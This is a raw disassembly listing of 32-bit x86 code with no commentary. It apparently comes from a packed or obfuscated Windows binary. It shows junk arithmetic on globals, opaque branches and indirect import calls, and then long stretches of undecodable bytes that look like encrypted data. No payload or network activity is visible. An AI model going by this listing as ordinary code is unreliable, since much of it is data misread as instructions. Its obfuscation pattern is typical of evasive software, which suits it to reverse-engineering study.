  40b311:	jecxz  0x40b370
  40b313:	std    
  40b314:	push   eax
  40b315:	adc    DWORD PTR ds:0x4282db,0x428293
  40b31f:	call   0x416c20
  40b324:	sbb    esi,DWORD PTR ds:0x428287
  40b32a:	mov    ecx,DWORD PTR [ebp-0x20]
  40b32d:	adc    esi,0x2986
  40b333:	mov    esi,DWORD PTR [ebp-0x1c]
  40b336:	sbb    DWORD PTR ds:0x42821b,0x4282db
  40b340:	push   0x5f43
  40b345:	or     edx,0x69b4
  40b34b:	sub    DWORD PTR ds:0x428373,0x4282db
  40b355:	push   0x1657
  40b35a:	xor    DWORD PTR ds:0x42835b,0x42824f
  40b364:	or     eax,0x528b
  40b369:	xor    edx,esi
  40b36b:	xor    eax,ecx
  40b36d:	sub    DWORD PTR ds:0x42838f,0x42822f
  40b377:	push   edx
  40b378:	push   eax
  40b379:	call   0x416c20
  40b37e:	xor    ecx,ecx
  40b380:	or     ecx,DWORD PTR ds:0x42828f
  40b386:	adc    DWORD PTR ds:0x428183,ecx
  40b38c:	mov    ecx,DWORD PTR [ebp-0x28]
  40b38f:	xor    DWORD PTR ds:0x4282f7,ecx
  40b395:	mov    esi,DWORD PTR [ebp-0x24]
  40b398:	and    DWORD PTR ds:0x428263,0x42824f
  40b3a2:	push   esi
  40b3a3:	add    DWORD PTR ds:0x42815b,0x5412
  40b3ad:	push   ecx
  40b3ae:	sub    DWORD PTR ds:0x428377,0x27f7
  40b3b8:	push   edx
  40b3b9:	push   eax
  40b3ba:	sub    DWORD PTR ds:0x428157,0x42838b
  40b3c4:	call   0x42205c
  40b3c9:	mov    DWORD PTR [ebp-0x30],eax
  40b3cc:	add    eax,DWORD PTR ds:0x42825b
  40b3d2:	mov    DWORD PTR [ebp-0x2c],edx
  40b3d5:	cmp    DWORD PTR ds:0x42828b,0x0
  40b3dc:	not    esi
  40b3de:	mov    DWORD PTR ds:0x428273,0x6e42
  40b3e8:	jmp    0x40b4a9
  40b3ed:	not    DWORD PTR ds:0x42830b
  40b3f3:	mov    eax,ds:0x428283
  40b3f8:	cmp    DWORD PTR ds:0x42828b,0x0
  40b3ff:	jl     0x40b428
  40b405:	push   0x2496
  40b40a:	push   DWORD PTR [ebp-0x28]
  40b40d:	call   DWORD PTR ds:0x428ecc
  40b413:	xor    edx,ecx
  40b415:	and    DWORD PTR ds:0x42817b,edx
  40b41b:	movzx  ecx,WORD PTR ds:0x42826b
  40b422:	or     DWORD PTR ds:0x4282fb,ecx
  40b428:	add    esi,edx
  40b42a:	adc    DWORD PTR ds:0x428157,0x1bfc
  40b434:	sub    esi,0x4a2f
  40b43a:	cmp    DWORD PTR ds:0x428383,0x0
  40b441:	mov    DWORD PTR ds:0x4282fb,ecx
  40b447:	mov    DWORD PTR ds:0x42837b,0x318c
  40b451:	mov    DWORD PTR ds:0x42838b,0x431a
  40b45b:	jmp    0x40b4a9
  40b460:	mov    DWORD PTR ds:0x428253,0x461b
  40b46a:	mov    DWORD PTR ds:0x42828f,0x63d9
  40b474:	cmp    DWORD PTR ds:0x428383,0x0
  40b47b:	jbe    0x40b49b
  40b481:	push   DWORD PTR [ebp-0x1c]
  40b484:	push   0x184b
  40b489:	call   DWORD PTR ds:0x428ed0
  40b48f:	xor    edx,DWORD PTR ds:0x428263
  40b495:	adc    ecx,DWORD PTR ds:0x42836b
  40b49b:	and    DWORD PTR ds:0x42815b,0x404c
  40b4a5:	and    edx,esi
  40b4a7:	add    ecx,edx
  40b4a9:	mov    DWORD PTR [ebp-0x10],0x5fa8
  40b4b0:	movzx  eax,WORD PTR ds:0x42826f
  40b4b7:	xor    DWORD PTR ds:0x428383,eax
  40b4bd:	mov    DWORD PTR [ebp-0xc],0x1751
  40b4c4:	dec    DWORD PTR ds:0x428253
  40b4ca:	mov    DWORD PTR [ebp-0x20],0x5e90
  40b4d1:	mov    DWORD PTR [ebp-0x1c],0xfc1
  40b4d8:	cmp    DWORD PTR ds:0x42816f,0x0
  40b4df:	mov    edx,0x29d6
  40b4e4:	mov    ecx,0x5377
  40b4e9:	not    esi
  40b4eb:	movzx  ecx,BYTE PTR ds:0x42814b
  40b4f2:	jmp    0x40b54e
  40b4f7:	mov    DWORD PTR ds:0x42821b,0x9f5
  40b501:	mov    DWORD PTR ds:0x428297,0x1c35
  40b50b:	cmp    DWORD PTR ds:0x42816f,0x0
  40b512:	je     0x40b542
  40b518:	push   0x427fc3
  40b51d:	push   0x400000
  40b522:	call   DWORD PTR ds:0x428db8
  40b528:	sbb    DWORD PTR ds:0x428287,edi
  40b52e:	mov    ecx,DWORD PTR ds:0x4281bf
  40b534:	xor    edx,edx
  40b536:	or     edx,DWORD PTR ds:0x4283ab
  40b53c:	sub    ecx,edx
  40b53e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40b542:	and    esi,DWORD PTR ds:0x42818b
  40b548:	sbb    esi,0x2386
  40b54e:	mov    DWORD PTR [ebp-0x28],0x7044
  40b555:	mov    DWORD PTR [ebp-0x24],0x7bf
  40b55c:	mov    eax,DWORD PTR [ebp-0x28]
  40b55f:	sbb    edx,DWORD PTR ds:0x428233
  40b565:	mov    ecx,DWORD PTR [ebp-0x24]
  40b568:	not    DWORD PTR ds:0x428263
  40b56e:	mov    edx,DWORD PTR [ebp-0x20]
  40b571:	or     DWORD PTR ds:0x428293,ecx
  40b577:	mov    esi,DWORD PTR [ebp-0x1c]
  40b57a:	sbb    DWORD PTR ds:0x42836b,0x428233
  40b584:	jmp    0x40b97a
  40b589:	adc    DWORD PTR [edx+0x10],esi
  40b58c:	packssdw mm5,QWORD PTR [edx+0xf]
  40b590:	jb     0x40b5e9
  40b592:	jnp    0x40b598
  40b594:	push   0x69
  40b596:	xchg   esp,eax
  40b597:	lods   eax,DWORD PTR ds:[esi]
  40b598:	mov    al,0xa
  40b59a:	adc    ebx,DWORD PTR [eax]
  40b59c:	sbb    BYTE PTR [esi+0x12],ch
  40b59f:	sbb    BYTE PTR [eax],bl
  40b5a1:	sub    dl,0x5e
  40b5a4:	xor    DWORD PTR [edx],ecx
  40b5a6:	inc    ebx
  40b5a7:	jns    0x40b5d3
  40b5a9:	xlat   BYTE PTR ds:[ebx]
  40b5aa:	dec    edx
  40b5ab:	sti    
  40b5ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5ad:	stos   BYTE PTR es:[edi],al
  40b5ae:	cmc    
  40b5af:	inc    edx
  40b5b0:	sbb    dl,bl
  40b5b2:	leave  
  40b5b3:	jne    0x40b5d7
  40b5b5:	das    
  40b5b6:	mov    ds:0x4aaefb4b,al
  40b5bb:	aaa    
  40b5bc:	pusha  
  40b5bd:	jbe    0x40b582
  40b5bf:	inc    ebx
  40b5c0:	jne    0x40b575
  40b5c2:	mov    edi,0xbc8e7c3b
  40b5c7:	push   eax
  40b5c8:	and    ebp,ecx
  40b5ca:	dec    ebx
  40b5cb:	(bad)  
  40b5cd:	lahf   
  40b5ce:	(bad)  
  40b5cf:	cmc    
  40b5d0:	std    
  40b5d1:	lahf   
  40b5d2:	xor    ebp,DWORD PTR [eax+0x23]
  40b5d5:	mov    esi,0x3ac594e5
  40b5da:	mov    bl,0x28
  40b5dc:	shrd   DWORD PTR [ebx-0x6114a93d],esi,cl
  40b5e3:	inc    edx
  40b5e4:	scas   al,BYTE PTR es:[edi]
  40b5e5:	adc    edx,DWORD PTR es:[edi+eiz*1+0x7e]
  40b5ea:	jmp    0xfcbd57d1
  40b5ef:	mov    bh,0xda
  40b5f1:	into   
  40b5f2:	sar    BYTE PTR [esi-0x6c],0xee
  40b5f6:	pop    eax
  40b5f7:	add    eax,0x9c4e8f0d
  40b5fc:	or     edx,ecx
  40b5fe:	lods   eax,DWORD PTR ds:[esi]
  40b5ff:	scas   eax,DWORD PTR es:[edi]
  40b600:	jmp    0x40b5df
  40b602:	cmp    ah,dl
  40b604:	shr    ebx,cl
  40b606:	dec    ecx
  40b607:	xchg   ecx,eax
  40b608:	je     0x40b5b4
  40b60a:	add    edi,edi
  40b60c:	add    esi,0x5
  40b60f:	pop    es
  40b610:	fistp  QWORD PTR [eax]
  40b612:	sub    DWORD PTR [esi+0x32],edx
  40b615:	(bad)  
  40b617:	push   ds
  40b618:	adc    al,0x8
  40b61a:	iret   
  40b61b:	mov    al,0x71
  40b61d:	jmp    0x7717:0x8c59b777
  40b624:	push   ebp
  40b625:	mov    al,ds:0x694204ee
  40b62a:	inc    esi
  40b62b:	push   cs
  40b62c:	cmp    BYTE PTR [edx+eiz*8],cl
  40b62f:	sub    eax,0xea06521
  40b634:	pop    ebx
  40b635:	(bad)
  40b638:	and    eax,0x3d630c96
  40b63d:	test   eax,esp
  40b63f:	add    edi,DWORD PTR [eax+0x56]
  40b642:	pop    ds
  40b643:	mov    ds:0x95f99686,eax
  40b648:	push   0xffffffc4
  40b64a:	(bad)  
  40b64b:	loop   0x40b69d
  40b64d:	stos   DWORD PTR es:[edi],eax
  40b64e:	inc    edx
  40b64f:	mov    ecx,0x7323def9
  40b654:	mov    edi,0xf6ec69be
  40b659:	fs ss in al,dx
  40b65c:	stc    
  40b65d:	inc    ebx
  40b65e:	mov    bl,0x50
  40b660:	ins    BYTE PTR es:[edi],dx
  40b661:	repz xchg edx,eax
  40b663:	push   ebp
  40b664:	data16 mov al,ds:0xa4d57c78
  40b66a:	jno    0x40b69f
  40b66c:	mov    al,BYTE PTR [edx+0x22eef481]
  40b672:	(bad)  ss:[ebx+0x17]
  40b676:	sub    eax,0xb58108df
  40b67b:	add    dl,dh
  40b67d:	shr    BYTE PTR ss:[ecx-0x74],cl
  40b681:	data16 loopne 0x40b6cd
  40b684:	sbb    bl,BYTE PTR [ebp+0x1b]
  40b687:	sahf   
  40b688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b689:	mov    DWORD PTR [ebx-0x1b],ebp
  40b68c:	(bad)  
  40b68d:	dec    edi
  40b68e:	push   ss
  40b68f:	add    dl,BYTE PTR [edi]
  40b691:	push   edx
  40b692:	push   ds
  40b693:	add    ch,BYTE PTR [ebx]
  40b695:	mov    ds:0x5bb9440a,eax
  40b69a:	fcmovbe st,st(7)
  40b69c:	push   eax
  40b69d:	int3   
  40b69e:	inc    ebx
  40b69f:	xor    DWORD PTR [esi+0x7f],esi
  40b6a2:	mov    ds:0x9fe9b19d,al
  40b6a7:	jbe    0x40b68a
  40b6a9:	push   0xffffffa3
  40b6ab:	sahf   
  40b6ac:	mov    al,ds:0x88366a42
  40b6b1:	or     edi,DWORD PTR [edx-0x67]
  40b6b4:	clc    
  40b6b5:	push   0x4a6dd0ec
  40b6ba:	push   ecx
  40b6bb:	sub    dl,cl
  40b6bd:	(bad)  
  40b6be:	push   edi
  40b6bf:	pop    es
  40b6c0:	cs mov dh,0x17
  40b6c3:	dec    esi
  40b6c4:	in     al,dx
  40b6c5:	sbb    DWORD PTR ds:0x8533bd5e,eax
  40b6cb:	inc    edi
  40b6cc:	jbe    0x40b740
  40b6ce:	in     eax,dx
  40b6cf:	xchg   ebp,eax
  40b6d0:	dec    ebp
  40b6d1:	enter  0xc109,0x5e
  40b6d5:	mov    dh,0x7f
  40b6d7:	rcr    BYTE PTR [ebx-0x477fe00d],1
  40b6dd:	mov    esp,0xc10a17ee
  40b6e2:	cmp    al,0xee
  40b6e4:	or     BYTE PTR [esi],cl
  40b6e6:	xor    bl,BYTE PTR [esi+0x3a]
  40b6e9:	add    ah,BYTE PTR [ebx+0xa6f2212]
  40b6ef:	aam    0x32
  40b6f1:	jg     0x40b757
  40b6f3:	imul   eax,DWORD PTR [edx-0x60],0x5c
  40b6f7:	scas   eax,DWORD PTR es:[edi]
  40b6f8:	popf   
  40b6f9:	push   eax
  40b6fa:	jb     0x40b749
  40b6fc:	push   0x0
  40b6fe:	mov    ecx,0xcfdeeb92
  40b703:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b704:	cdq    
  40b705:	sti    
  40b706:	in     al,0x6d
  40b708:	aad    0x2e
  40b70a:	test   dl,cl
  40b70c:	outs   dx,BYTE PTR ds:[esi]
  40b70d:	push   ss
  40b70e:	(bad)  
  40b70f:	mov    ?,edi
  40b711:	adc    eax,0xde4bacf7
  40b716:	shl    DWORD PTR [ebx],1
  40b718:	inc    ebx
  40b719:	ficom  WORD PTR [eax]
  40b71b:	or     ch,BYTE PTR [ebx]
  40b71d:	lods   eax,DWORD PTR ds:[esi]
  40b71e:	mov    al,0x66
  40b720:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b722:	mov    eax,ds:0x75481ba
  40b727:	push   0xffffff81
  40b729:	fisub  DWORD PTR [edi]
  40b72b:	mov    al,ds:0x2370fbb7
  40b730:	repz in eax,dx
  40b732:	lahf   
  40b733:	loopne 0x40b6c0
  40b735:	and    BYTE PTR [ebx],0xd5
  40b738:	sti    
  40b739:	mov    edi,0xf796de5c
  40b73e:	sub    al,0xa1
  40b740:	fld    DWORD PTR [eax-0x37e2b465]
  40b746:	jg     0x40b786
  40b748:	push   edx
  40b749:	clc    
  40b74a:	cmp    al,0x7b
  40b74c:	push   esp
  40b74d:	fiadd  DWORD PTR [edi]
  40b74f:	xor    BYTE PTR [ebx],ah
  40b751:	mov    esp,0x520ee5fb
  40b756:	jecxz  0x40b785
  40b758:	out    0xb3,al
  40b75a:	aas    
  40b75b:	or     BYTE PTR [edi-0x2c],0x8f
  40b75f:	cmp    esi,edx
  40b761:	test   BYTE PTR [edx+0x624f3049],0x1d
  40b768:	jmp    0x40b70b
  40b76a:	cdq    
  40b76b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b76c:	mov    fs,edx
  40b76e:	fimul  DWORD PTR [ebx+edi*8]
  40b771:	mov    bh,0x55
  40b773:	test   DWORD PTR [ecx+0x7f],0x8e3eb89d
  40b77a:	fucomi st,st(7)
  40b77c:	sub    BYTE PTR [edi+0xf],cl
  40b77f:	popa   
  40b780:	(bad)  [edi+0x6ca78dd4]
  40b786:	and    al,0x82
  40b788:	stos   DWORD PTR es:[edi],eax
  40b789:	pop    edi
  40b78a:	shl    ebp,0xb5
  40b78d:	push   0x22
  40b78f:	mov    esp,0x8ee4f77e
  40b794:	adc    eax,0xbc2962f8
  40b799:	ja     0x40b7d6
  40b79b:	repnz retf 0xa400
  40b79f:	dec    esp
  40b7a0:	into   
  40b7a1:	sbb    DWORD PTR [edx-0x372d7f06],edi
  40b7a7:	and    dl,BYTE PTR [edx-0x5f]
  40b7aa:	hlt    
  40b7ab:	lahf   
  40b7ac:	mov    ah,0xb3
  40b7ae:	mov    eax,ds:0x8b438074
  40b7b3:	out    dx,al
  40b7b4:	js     0x40b7b8
  40b7b6:	int    0xcb
  40b7b8:	js     0x40b7a5
  40b7ba:	adc    esp,eax
  40b7bc:	jae    0x40b7f1
  40b7be:	out    0xce,eax
  40b7c0:	fcos   
  40b7c2:	imul   edx,DWORD PTR [edx],0xef59aaa
  40b7c8:	pop    ss
  40b7c9:	aam    0xf5
  40b7cb:	fwait
  40b7cc:	sahf   
  40b7cd:	pop    esi
  40b7ce:	fimul  WORD PTR [eax+0x3b486d07]
  40b7d4:	push   es
  40b7d5:	pushf  
  40b7d6:	daa    
  40b7d7:	ins    BYTE PTR es:[edi],dx
  40b7d8:	(bad)  
  40b7d9:	icebp  
  40b7da:	out    dx,eax
  40b7db:	stc    
  40b7dc:	leave  
  40b7dd:	pop    ss
  40b7de:	pop    ds
  40b7df:	mov    eax,DWORD PTR [ebx+ebx*8]
  40b7e2:	aaa    
  40b7e3:	icebp  
  40b7e4:	subps  xmm5,XMMWORD PTR ss:[esi]
  40b7e8:	les    esi,FWORD PTR [ecx+0x113f72c7]
  40b7ee:	and    BYTE PTR [ebx-0x35],ah
  40b7f1:	sub    al,0xd3
  40b7f3:	fisubr DWORD PTR [edx-0x2881b6ac]
  40b7f9:	pop    esp
  40b7fa:	push   ebx
  40b7fb:	rcl    BYTE PTR [edi-0x4849fe77],1
  40b801:	sbb    DWORD PTR [ebp-0x35],0x1c2a43f4
  40b808:	int3   
  40b809:	mov    dh,0x54
  40b80b:	aam    0x86
  40b80d:	pop    ebp
  40b80e:	adc    bl,dl
  40b810:	imul   ecx,ebp,0x9e96d55f
  40b816:	pop    esi
  40b817:	repnz dec ebp
  40b819:	cmc    
  40b81a:	scas   eax,DWORD PTR es:[edi]
  40b81b:	mov    cl,0x94
  40b81d:	jmp    0xaf0ff084
  40b822:	out    dx,eax
  40b823:	lea    eax,[ebx+0x44]
  40b826:	aad    0x64
  40b828:	adc    al,0xc4
  40b82a:	adc    BYTE PTR [ebx+0x642add7f],ah
  40b830:	pop    edx
  40b831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b832:	xor    eax,0xd27f6b41
  40b837:	fiadd  WORD PTR [ebp+0x3d]
  40b83a:	push   0xffffff98
  40b83c:	pop    esi
  40b83d:	js     0x40b7fb
  40b83f:	inc    esi
  40b840:	lods   al,BYTE PTR ds:[esi]
  40b841:	adc    eax,DWORD PTR [edx]
  40b843:	bound  ecx,QWORD PTR [eax+0x67]
  40b846:	and    eax,0x506d47f
  40b84b:	sti    
  40b84c:	je     0x40b7ce
  40b84e:	cdq    
  40b84f:	(bad)  
  40b850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b851:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b852:	iret   
  40b853:	mov    ch,0x50
  40b855:	bound  edx,QWORD PTR [ebp+0x5b321f15]
  40b85b:	xor    cl,BYTE PTR [ebp+0x7d608ef4]
  40b861:	sti    
  40b862:	push   esp
  40b863:	jns    0x40b861
  40b865:	aaa    
  40b866:	repz push edi
  40b868:	cmp    DWORD PTR [eax],esp
  40b86a:	(bad)  
  40b86b:	cli    
  40b86c:	push   esi
  40b86d:	xchg   esp,eax
  40b86e:	cmp    DWORD PTR [eax-0x2b],0x35
  40b872:	sbb    eax,0x9efafadc
  40b877:	fistp  DWORD PTR [ecx-0x2a]
  40b87a:	fstp   TBYTE PTR ds:0x872f4711
  40b880:	mov    ds:0x1ee69c92,eax
  40b885:	mov    esi,0xd7432313
  40b88a:	pop    ecx
  40b88b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b88c:	jmp    0xbb7e:0xee389058
  40b893:	sahf   
  40b894:	inc    edx
  40b895:	(bad)  
  40b896:	jne    0x40b87d
  40b898:	fnstsw WORD PTR [eax+0xa]
  40b89b:	or     eax,0x8a9f7ae2
  40b8a0:	xor    DWORD PTR [edx+0x65ae55b5],eax
  40b8a6:	pop    ss
  40b8a7:	add    ah,BYTE PTR [ecx+0x6a]
  40b8aa:	scas   eax,DWORD PTR es:[edi]
  40b8ab:	dec    esi
  40b8ac:	hlt    
  40b8ad:	sbb    al,0x34
  40b8af:	push   ebp
  40b8b0:	xor    eax,0xf5b46741
  40b8b5:	push   ebp
  40b8b6:	dec    BYTE PTR [eax-0x6d5c8b09]
  40b8bc:	inc    esi
  40b8bd:	in     eax,dx
  40b8be:	dec    eax
  40b8bf:	mov    ds:0x26c8e58d,al
  40b8c4:	pop    es
  40b8c5:	jmp    0xdc59:0xa49ba9ee
  40b8cc:	rol    BYTE PTR [edi+0x76923f0],cl
  40b8d2:	sub    al,0xfd
  40b8d4:	adc    edi,DWORD PTR [ebp+eiz*1+0xe]
  40b8d8:	stos   DWORD PTR es:[edi],eax
  40b8d9:	dec    eax
  40b8da:	push   0x70
  40b8dc:	inc    ecx
  40b8dd:	mov    edi,0x6c92eec9
  40b8e2:	addr16 lahf 
  40b8e4:	mov    esi,DWORD PTR ds:0x5df704a5
  40b8ea:	out    dx,eax
  40b8eb:	aam    0x52
  40b8ed:	adc    esi,DWORD PTR [eax+0x21750c3d]
  40b8f3:	mov    cl,0x5c
  40b8f5:	xchg   edx,eax
  40b8f6:	sti    
  40b8f7:	jg     0x40b918
  40b8f9:	mov    ecx,0x37633ca4
  40b8fe:	pusha  
  40b8ff:	jge    0x40b8b6
  40b901:	inc    edi
  40b902:	fisub  WORD PTR [esi-0x7e5beed4]
  40b908:	clc    
  40b909:	out    dx,eax
  40b90a:	cmp    eax,0x51b49d3b
  40b90f:	daa    
  40b910:	cmp    ah,bh
  40b912:	push   0x55d1543c
  40b917:	cwde   
  40b918:	sar    DWORD PTR [ebx],1
  40b91a:	arpl   WORD PTR [esi-0xd],di
  40b91d:	je     0x40b92d
  40b91f:	and    esi,ecx
  40b921:	push   esp
  40b922:	and    al,0xe4
  40b924:	dec    ecx
  40b925:	les    ebx,FWORD PTR [edx+edx*4+0x6ecbdfc2]
  40b92c:	or     bl,ah
  40b92e:	inc    ebx
  40b92f:	mov    ah,BYTE PTR [ecx]
  40b931:	lods   al,BYTE PTR ds:[esi]
  40b932:	cmp    bl,dh
  40b934:	or     ecx,DWORD PTR [eax+0x3a]
  40b937:	outs   dx,BYTE PTR ds:[esi]
  40b938:	int    0xb3
  40b93a:	dec    edx
  40b93b:	sub    cl,dh
  40b93d:	imul   ecx,DWORD PTR [edi-0x4e035f93],0xffffffdf
  40b944:	fs cmp cl,bh
  40b947:	mov    ebp,0xe88a9a66
  40b94c:	xchg   ebp,eax
  40b94d:	xor    DWORD PTR [edi-0x5b6d1c07],eax
  40b953:	out    0x18,al
  40b955:	pop    es
  40b956:	pop    edi
  40b957:	sub    dl,dh
  40b959:	and    ah,cl
  40b95b:	call   0x7f1f:0x9d50cea3
  40b962:	in     al,0xc3
  40b964:	and    esi,DWORD PTR [edi+0x54fcd3ce]
  40b96a:	sub    eax,0x7fcef0a6
  40b96f:	pop    esi
  40b970:	add    al,0xe3
  40b972:	sbb    al,0xca
  40b974:	sar    BYTE PTR [ebp+0xc],1
  40b977:	or     al,0x28
  40b979:	xchg   ebx,eax
  40b97a:	add    eax,0x355c
  40b97f:	adc    ecx,0x819
  40b985:	adc    DWORD PTR ds:0x4282e3,0xc1d
  40b98f:	or     eax,edx
  40b991:	mov    edx,DWORD PTR [ebp-0x10]
  40b994:	or     ecx,esi
  40b996:	and    esi,DWORD PTR ds:0x428267
  40b99c:	mov    esi,DWORD PTR [ebp-0xc]
  40b99f:	and    DWORD PTR ds:0x4282f7,0x1cd5
  40b9a9:	or     eax,edx
  40b9ab:	cmp    DWORD PTR ds:0x4282ff,0x0
  40b9b2:	mov    edx,0xd4e
  40b9b7:	not    edx
  40b9b9:	mov    DWORD PTR ds:0x428267,0x1f80
  40b9c3:	jmp    0x40ba42
  40b9c8:	mov    DWORD PTR ds:0x4282ff,0x2492
  40b9d2:	mov    DWORD PTR ds:0x42838f,0xa5a
  40b9dc:	cmp    DWORD PTR ds:0x4282ff,0x0
  40b9e3:	jbe    0x40ba20
  40b9e9:	push   DWORD PTR [ebp-0x1c]
  40b9ec:	push   0x148d
  40b9f1:	call   DWORD PTR ds:0x428dbc
  40b9f7:	adc    DWORD PTR ds:0x42838b,0x175a
  40ba01:	not    edx
  40ba03:	movzx  edx,WORD PTR ds:0x4282e7
  40ba0a:	sub    edx,DWORD PTR ds:0x4282fb
  40ba10:	mov    DWORD PTR ds:0x4282e7,edx
  40ba16:	adc    DWORD PTR ds:0x4282e3,0x62d2
  40ba20:	mov    edx,DWORD PTR ds:0x428157
  40ba26:	xor    DWORD PTR ds:0x428383,edx
  40ba2c:	or     DWORD PTR ds:0x42822f,0x5c0
  40ba36:	mov    edx,DWORD PTR ds:0x428267
  40ba3c:	or     DWORD PTR ds:0x428303,edx
  40ba42:	mov    edx,DWORD PTR [ebp-0x30]
  40ba45:	or     ecx,esi
  40ba47:	mov    esi,DWORD PTR [ebp-0x2c]
  40ba4a:	or     eax,0xf34
  40ba4f:	or     ecx,0x6c90
  40ba55:	cmp    edx,eax
  40ba57:	jne    0x40ba65
  40ba5d:	cmp    esi,ecx
  40ba5f:	je     0x40cc06
  40ba65:	mov    DWORD PTR [ebp-0x30],0x5ddc
  40ba6c:	mov    DWORD PTR [ebp-0x2c],0x7433
  40ba73:	mov    eax,DWORD PTR [ebp-0x30]
  40ba76:	mov    ecx,DWORD PTR [ebp-0x2c]
  40ba79:	xor    ecx,0xfffffd1f
  40ba7f:	xor    eax,0xffff9fff
  40ba84:	and    ecx,0x6e0
  40ba8a:	and    eax,0x6244
  40ba8f:	mov    DWORD PTR [ebp-0x10],eax
  40ba92:	jmp    0x40be88
  40ba97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba99:	test   al,0x41
  40ba9b:	test   al,0x3d
  40ba9d:	sbb    al,0x1c
  40ba9f:	fdiv   QWORD PTR [edx]
  40baa1:	mov    bl,0x7c
  40baa3:	sub    edi,ebx
  40baa5:	push   edi
  40baa6:	stos   BYTE PTR es:[edi],al
  40baa7:	pusha  
  40baa8:	or     eax,0x126e1818
  40baad:	sbb    BYTE PTR [eax],bl
  40baaf:	cmp    edx,edx
  40bab1:	sbb    DWORD PTR [edi],esp
  40bab3:	xor    eax,0x9220c94d
  40bab8:	cmp    al,0xec
  40baba:	xchg   edi,eax
  40babb:	xor    DWORD PTR [ecx-0x7d],esi
  40babe:	mov    ch,ch
  40bac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bac1:	or     BYTE PTR [ebx-0xa5fa23a],ah
  40bac7:	sub    ebx,ebp
  40bac9:	adc    cl,BYTE PTR [eax]
  40bacb:	test   BYTE PTR [ecx-0x55bfc4ab],bh
  40bad1:	in     eax,0x83
  40bad3:	adc    cl,BYTE PTR [ecx]
  40bad5:	into   
  40bad6:	lahf   
  40bad7:	pop    ds
  40bad8:	xor    DWORD PTR [edx-0x2d],ebx
  40badb:	call   0xe5db:0x681aa5db
  40bae2:	sti    
  40bae3:	nop
  40bae4:	fadd   DWORD PTR [esi-0x7ccc05ee]
  40baea:	xchg   BYTE PTR [eax],cl
  40baec:	pop    eax
  40baed:	stos   DWORD PTR es:[edi],eax
  40baee:	iret   
  40baef:	int    0xd2
  40baf1:	adc    edi,DWORD PTR [ecx-0xe]
  40baf4:	pop    es
  40baf5:	inc    ebp
  40baf6:	inc    edx
  40baf7:	test   cl,0xdf
  40bafa:	and    eax,0x840a3125
  40baff:	jle    0x40bb35
  40bb01:	adc    bh,cl
  40bb03:	cdq    
  40bb04:	pop    es
  40bb05:	jmp    0xd610:0x87455415
  40bb0c:	sub    al,BYTE PTR [ecx]
  40bb0e:	pop    ebp
  40bb0f:	mov    WORD PTR [esi+0x5a],fs
  40bb12:	and    BYTE PTR ds:0xe68d690a,ch
  40bb18:	leave  
  40bb19:	sti    
  40bb1a:	dec    ecx
  40bb1b:	xchg   edi,eax
  40bb1c:	xor    cl,BYTE PTR [ebx-0x5]
  40bb1f:	scas   al,BYTE PTR es:[edi]
  40bb20:	adc    ebx,DWORD PTR [esi+0x387fffc0]
  40bb26:	sar    edi,1
  40bb28:	test   DWORD PTR [eax+eax*2-0xe5e5cd9],0x8ba320ce
  40bb33:	cmp    eax,0x116d5ae2
  40bb38:	scas   eax,DWORD PTR es:[edi]
  40bb39:	or     BYTE PTR [edx+0x5fe4320f],cl
  40bb3f:	pop    esp
  40bb40:	pop    DWORD PTR [ecx]
  40bb42:	in     al,dx
  40bb43:	and    bh,BYTE PTR [esi+0x71]
  40bb46:	adc    eax,0x8274b982
  40bb4b:	or     eax,0xed13446c
  40bb50:	iret   
  40bb51:	mov    esi,0x524f123d
  40bb56:	mov    bh,0x4f
  40bb58:	dec    ebx
  40bb59:	sub    cl,BYTE PTR [eax-0x8]
  40bb5c:	mov    DWORD PTR ds:0xd3a64373,edx
  40bb62:	inc    ebx
  40bb63:	mov    bl,0x38
  40bb65:	mov    ebp,0xc4c74f4c
  40bb6a:	mov    WORD PTR [esi],?
  40bb6c:	add    al,0x1e
  40bb6e:	imul   BYTE PTR [eax]
  40bb70:	jecxz  0x40bb28
  40bb72:	mov    edi,ebx
  40bb74:	test   al,0x23
  40bb76:	inc    esi
  40bb77:	sub    esi,DWORD PTR [edx-0x38fd76eb]
  40bb7d:	adc    BYTE PTR [edi-0x39],ch
  40bb80:	adc    eax,DWORD PTR [ecx-0x16147dc5]
  40bb86:	add    BYTE PTR [ebx-0x703bad4],0xe9
  40bb8d:	fnstsw ax
  40bb8f:	(bad)  
  40bb90:	in     eax,0xbf
  40bb92:	das    
  40bb93:	jp     0x40bb7f
  40bb95:	sbb    al,0xb4
  40bb97:	mov    dh,0x1c
  40bb99:	fwait
  40bb9a:	sub    al,0xab
  40bb9c:	inc    eax
  40bb9d:	xor    al,0x71
  40bb9f:	(bad)  [ecx]
  40bba1:	mov    ecx,0xa6cd50fc
  40bba6:	fimul  DWORD PTR [ecx-0x30f4d881]
  40bbac:	add    esi,DWORD PTR [ebp-0x3e6d8512]
  40bbb2:	(bad)  
  40bbb3:	adc    al,0x53
  40bbb5:	nop
  40bbb6:	(bad)  
  40bbb7:	jae    0x40bc0e
  40bbb9:	mov    edx,0x55f1d33e
  40bbbe:	mov    ebx,ebp
  40bbc0:	cmp    al,0x31
  40bbc2:	test   al,0x29
  40bbc4:	pop    ds
  40bbc5:	and    eax,esp
  40bbc7:	mov    edi,0x994e2aa0
  40bbcc:	push   ebp
  40bbcd:	dec    ebp
  40bbce:	jae    0x40bbc8
  40bbd0:	sar    DWORD PTR [edx-0xb0e1a91],0x84
  40bbd7:	in     al,dx
  40bbd8:	xchg   esi,eax
  40bbd9:	sti    
  40bbda:	in     eax,dx
  40bbdb:	sbb    esp,DWORD PTR [ebx-0x79fcff29]
  40bbe1:	fcmovne st,st(2)
  40bbe3:	pop    ss
  40bbe4:	retf   0x4a88
  40bbe7:	push   0x2ae67a64
  40bbec:	jbe    0x40bbb2
  40bbee:	popa   
  40bbef:	push   si
